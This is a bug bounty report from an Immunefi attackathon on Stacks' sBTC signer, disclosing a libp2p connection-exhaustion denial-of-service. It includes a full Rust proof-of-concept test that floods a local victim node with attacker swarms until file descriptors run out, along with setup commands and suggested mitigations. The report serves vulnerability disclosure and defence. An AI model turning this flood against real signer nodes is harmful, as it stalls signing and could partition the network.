# #42773 \[BC-Medium] Signers can be compromised by a libp2p DoS attack

**Submitted on Mar 26th 2025 at 08:59:27 UTC by @Pig46940 for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #42773
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* **Impacts:**
  * Unintended chain split (network partition)

## Description

## Brief/Intro

The Stacks signer lacks connection rate limiting, maximum concurrent connection checks, and restrictions on peer connection requests, making it vulnerable to potential libp2p Denial-of-Service (DoS) attacks from a malicious signer.

## Vulnerability Details

Currently, the Stacks signer does not have any specific rate or concurrent network connection limit logic. However, it connects to other signer nodes according to the [connection diagram](https://docs.stacks.co/guides-and-tutorials/sbtc/how-to-run-sbtc-signer#connection-diagram) using the libp2p library. In the default implementation, libp2p does not enforce rate limiting or concurrent network connection restrictions. As a result, a malicious signer can easily compromise the system by establishing numerous connections via libp2p, ultimately causing the signer process to crash due to file descriptor exhaustion, as each established connection consumes a file descriptor.

## Impact Details

A malicious signer can attack as many signer nodes as possible by exploiting this vulnerability. This will cause the signer’s main processes to cease, including signing and validating Stacks blocks produced by Stacks miners, signing and validating sBTC mint and redeem transactions, and securing BTC rewards for their work. Eventually, it may cause the unintended chain split (network partition).

### Attacking Scenario

1. Malicious attacker node(s) (known signer) increase their file descriptors to the maximum possible value to prevent themselves from stalling.\
   **Reference:** [Baeldung - Limit File Descriptors](https://www.baeldung.com/linux/limit-file-descriptors)
2. Malicious attacker node(s) (known signer) launch an attack by simultaneously increasing the libp2p swarm process, which in turn increases connections to all known public victim signer nodes, reaching the maximum number of established connections (default: 1024) and exhausting the available file descriptors on each victim signer node.
3. As a result, all victim signer nodes become unable to process computations and stall due to file descriptor exhaustion.\
   **Reference:** See the attachment of this attacking diagram

## References

* [connection diagram](https://docs.stacks.co/guides-and-tutorials/sbtc/how-to-run-sbtc-signer#connection-diagram)
* [signer network implementation](https://github.com/stacks-network/sbtc/tree/main/signer/src/network)
* \[Too many open files error] (<https://www.howtogeek.com/805629/too-many-open-files-linux/>)
* [Client connection and File descriptor](https://docs.oracle.com/cd/E19476-01/821-0505/file-descriptor-requirements.html)
* [Ethereum Lighthouse Client(Consensus Node) ConnectionLimits Implementaion](https://github.com/sigp/lighthouse/blob/bf955c7543dac8911a6f6c334b5b3ca4ef728d9c/beacon_node/lighthouse_network/src/service/mod.rs#L415)
* [Rust libp2p ConnectionLimits](https://docs.rs/libp2p-connection-limits/latest/libp2p_connection_limits/struct.ConnectionLimits.html)

## Proof of Concept

## Proof of Concept

This Proof of Concept (PoC) demonstrates that an attacker node can establish an excessive number of connections with the `libp2p` swarm to a victim node (Port: 19999) due to the lack of connection mitigation implementation. Eventually, this leads to file descriptor exhaustion, causing the application to stall with the error message **"too many open files"** (as shown in `poc_diagram.png`).

**Reference:**&#x20;

### PoC Code

```rust
/// # Swarm Resource Exhaustion Vulnerability Proof of Concept
///
/// This test demonstrates a potential Denial of Service (DoS) vulnerability
/// through systematic resource exhaustion in a peer-to-peer network swarm.
///
/// # Vulnerability Overview
/// - Attacker can create multiple network swarm connections
/// - Progressively consume system resources (file descriptors, memory)
/// - Potentially overwhelm the target node's network capabilities
///
/// # Vulnerability Analysis Notes
///
/// 1. Attack Vector:
///    - Create multiple swarm connections to a single target node
///    - Systematically consume system resources
///
/// 2. Potential Impact:
///    - Exhausts file descriptors
///    - Consumes excessive memory
///    - Potentially disrupts node's network functionality
///
/// 3. Mitigation Strategies:
///    - Implement connection rate limiting
///    - Add maximum concurrent connection checks
///    - Use resource monitoring and automatic throttling
///    - Restrict peer connection requests
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use tokio::task::JoinSet;
use tokio::time::sleep;
/// Simulates a resource exhaustion attack on a network swarm
#[tokio::test]
async fn test_swarm_resource_exhaustion() {
    use crate::keys::PublicKey;
    use crate::testing::context::BuildContext;
    use crate::testing::context::ConfigureMockedClients;
    use crate::testing::context::ConfigureSettings;
    use crate::testing::context::ConfigureStorage;
    use crate::testing::context::TestContext;

    // Initialize logging for test diagnostics
    let _ = tracing_subscriber::fmt().with_env_filter("info").try_init();

    // Prepare keys for victim and attacker nodes
    let victim_private_key = PrivateKey::new(&mut rand::thread_rng());
    let attacker_private_key = PrivateKey::new(&mut rand::thread_rng());

    // Configure victim node context
    let victim_context = TestContext::builder()
        .with_in_memory_storage()
        .with_mocked_clients()
        .modify_settings(|settings| {
            settings.signer.private_key = victim_private_key;
        })
        .build();

    // Allow attacker to be part of victim's signer set (simulating trust)
    victim_context
        .state()
        .current_signer_set()
        .add_signer(PublicKey::from_private_key(&attacker_private_key));

    // Set up victim node network configuration
    let victim_port = 19999;
    let victim_addr: Multiaddr = format!("/ip4/127.0.0.1/tcp/{}", victim_port)
        .parse()
        .unwrap();

    // Build victim's swarm with minimal configuration
    let mut victim_swarm = SignerSwarmBuilder::new(&victim_private_key)
        .add_listen_endpoint(victim_addr.clone())
        .enable_mdns(false)
        .with_initial_bootstrap_delay(Duration::from_millis(100))
        .add_seed_addrs(&[victim_addr.clone()])
        .build()
        .expect("Failed to build victim node");

    // Track system resource consumption
    let swarm_count = Arc::new(AtomicUsize::new(0));
    let exhaustion_detected = Arc::new(AtomicBool::new(false));

    // Containers for managing multiple swarm connections
    let mut swarms = Vec::new();
    let mut swarm_addrs = Vec::new();
    let mut swarm_tasks = JoinSet::new();

    // Start victim swarm
    swarm_tasks.spawn(async move {
        if let Err(e) = victim_swarm.start(&victim_context).await {
            tracing::warn!("Victim node failed to start: {}", e);
        }
    });

    sleep(Duration::from_millis(50)).await;

    // Simulate attack by creating numerous network connections
    for i in 0..65535 {
        // Create unique port for each swarm
        let port = 20000 + i;
        let addr: Multiaddr = format!("/ip4/127.0.0.1/tcp/{}", port).parse().unwrap();

        // Build attacker swarm with connection to victim
        let builder = SignerSwarmBuilder::new(&attacker_private_key)
            .add_listen_endpoint(addr.clone())
            .enable_mdns(false)
            .with_initial_bootstrap_delay(Duration::from_millis(100))
            .add_seed_addrs(&[victim_addr.clone()]);

        // Attempt to build swarm, track failure
        let swarm = match builder.build() {
            Ok(s) => s,
            Err(e) => {
                tracing::warn!("Failed to build swarm {}: {}", i, e);
                tracing::info!("Successfully created {} swarms before hitting error", i);
                exhaustion_detected.store(true, Ordering::Relaxed);
                break;
            }
        };

        // Store swarm and address for tracking
        swarm_addrs.push(addr);
        swarms.push(swarm.clone());
        swarm_count.fetch_add(1, Ordering::Relaxed);

        // Create attacker context
        let attacker_context = TestContext::builder()
            .with_in_memory_storage()
            .with_mocked_clients()
            .modify_settings(|settings| {
                settings.signer.private_key = attacker_private_key;
            })
            .build();

        attacker_context
            .state()
            .current_signer_set()
            .add_signer(PublicKey::from_private_key(&victim_private_key));

        // Start sudden connection increase by attacker node
        if !swarms.is_empty() {
            let idx = i % swarms.len();
            let mut swarm_to_start = swarms[idx].clone();
            let exhaustion_clone = exhaustion_detected.clone();

            swarm_tasks.spawn(async move {
                if let Err(e) = swarm_to_start.start(&attacker_context).await {
                    tracing::warn!("Swarm {} failed to start: {}", idx, e);
                    exhaustion_clone.store(true, Ordering::Relaxed);
                }
            });
        }

        // Output the resource increase
        let (fd_count, memory_mb) = get_resource_usage().await;
        tracing::info!(
            "Current state: {} swarms, {} file descriptors, {}MB memory",
            swarm_count.load(Ordering::Relaxed),
            fd_count,
            memory_mb
        );

        // Resource exhaustion thresholds
        if fd_count > 1500 || memory_mb > 4096 {
            tracing::warn!(
                "Resource exhaustion detected: {} FDs, {}MB memory",
                fd_count,
                memory_mb
            );
            exhaustion_detected.store(true, Ordering::Relaxed);
            break;
        }

        // Prevent overwhelming the system
        sleep(Duration::from_millis(50)).await;

        // Exit if exhaustion detected
        if exhaustion_detected.load(Ordering::Relaxed) {
            break;
        }
    }

    // Final resource consumption check
    let (final_fd_count, final_memory_mb) = get_resource_usage().await;

    tracing::info!(
        "Test completed: {} swarms, {} file descriptors, {}MB memory",
        swarm_count.load(Ordering::Relaxed),
        final_fd_count,
        final_memory_mb
    );

    // Clean up swarms
    swarms.clear();

    // Verify resource exhaustion occurred
    assert!(
        exhaustion_detected.load(Ordering::Relaxed),
        "Expected to detect resource exhaustion"
    );
}

/// Retrieve current system resource usage
async fn get_resource_usage() -> (usize, usize) {
    let fd_count = get_open_file_descriptors().unwrap_or(0);
    let memory_mb = get_memory_usage_mb().unwrap_or(0);
    (fd_count, memory_mb)
}

/// Determine number of open file descriptors (Unix-based systems)
fn get_open_file_descriptors() -> Result<usize, String> {
    #[cfg(target_family = "unix")]
    {
        use std::fs;
        use std::path::Path;

        // Check Linux-style proc filesystem
        let proc_path = Path::new("/proc/self/fd");
        if proc_path.exists() {
            return match fs::read_dir(proc_path) {
                Ok(entries) => Ok(entries.count()),
                Err(e) => Err(format!("Failed to read proc fs: {}", e)),
            };
        }

        // Fallback for MacOS
        use std::process::Command;
        let output = Command::new("lsof")
            .arg("-p")
            .arg(std::process::id().to_string())
            .output();

        match output {
            Ok(out) => {
                let lines = String::from_utf8_lossy(&out.stdout)
                    .lines()
                    .filter(|l| !l.is_empty())
                    .count();
                Ok(lines)
            }
            Err(_) => Err("Could not run lsof".to_string()),
        }
    }

    #[cfg(not(target_family = "unix"))]
    {
        Err("Not implemented on non-Unix platforms".to_string())
    }
}

/// Estimate current memory usage in megabytes (Unix-based systems)
fn get_memory_usage_mb() -> Result<usize, String> {
    #[cfg(target_family = "unix")]
    {
        use std::fs;
        use std::io::Read;

        // Linux memory tracking via /proc
        if let Ok(mut file) = fs::File::open("/proc/self/status") {
            let mut content = String::new();
            if file.read_to_string(&mut content).is_ok() {
                for line in content.lines() {
                    if line.starts_with("VmRSS:") {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 2 {
                            if let Ok(kb) = parts[1].parse::<usize>() {
                                return Ok(kb / 1024); // Convert kB to MB
                            }
                        }
                    }
                }
            }
        }

        // MacOS fallback using ps command
        use std::process::Command;
        let output = Command::new("ps")
            .arg("-o")
            .arg("rss=")
            .arg("-p")
            .arg(std::process::id().to_string())
            .output();

        match output {
            Ok(out) => {
                let rss_str = String::from_utf8_lossy(&out.stdout).trim().to_string();
                if let Ok(kb) = rss_str.parse::<usize>() {
                    Ok(kb / 1024) // Convert kB to MB
                } else {
                    Err("Failed to parse ps output".to_string())
                }
            }
            Err(_) => Err("Could not run ps".to_string()),
        }
    }

    #[cfg(not(target_family = "unix"))]
    {
        Err("Not implemented on non-Unix platforms".to_string())
    }
}

```

### Setting Up the PoC

1. Clone the `sbtc` repository:

```bash
$ git clone https://github.com/stacks-network/sbtc.git
$ cd sbtc
```

2. Append the PoC code to the `swarm.rs` file:

```bash
$ vim signer/src/network/libp2p/swarm.rs
# Paste PoC code at the end of the swarm.rs file
```

### Running the PoC

```bash
$ cargo test -vvv test_swarm_resource_exhaustion -- --nocapture
```

### Observing the Vulnerability

During the execution of this test, you will see many established connections between the attacker node (port: N) and the victim node (port: 19999).

```
$ watch -n 0.1 "ss -t -n -o -p state established | sort -k 3 -n"
```

* The `ss` command output shows that the victim node (port: 19999) has many established connections, using file descriptors.

  **Reference:**&#x20;
* The screenshot shows the process being stalled with the "too many open files" error message.

  **Reference:**&#x20;
